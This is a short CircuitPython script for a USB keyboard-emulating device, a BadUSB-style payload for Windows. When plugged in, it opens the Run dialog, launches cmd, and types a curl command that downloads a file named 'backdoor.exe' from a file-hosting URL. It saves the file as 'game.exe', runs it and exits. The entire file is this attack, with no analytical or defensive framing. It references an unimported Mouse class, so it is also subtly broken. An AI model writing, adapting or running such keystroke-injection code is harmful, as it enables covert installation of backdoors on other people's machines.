import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
import board
import digitalio


mouse = Mouse(usb_hid.devices)
time.sleep(1)
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

S = 1
while S < 2:
    keyboard.press(Keycode.WINDOWS, Keycode.R)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard_layout.write("cmd")
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(1)
    keyboard_layout.write("curl https://download1645.mediafire.com/k6q51h8cz1dg/rfgtmorlhf5tc6z/backdoor.exe --output game.exe\n")
    keyboard_layout.write("game.exe\n")
    keyboard_layout.write("exit\n")
    S = S+1


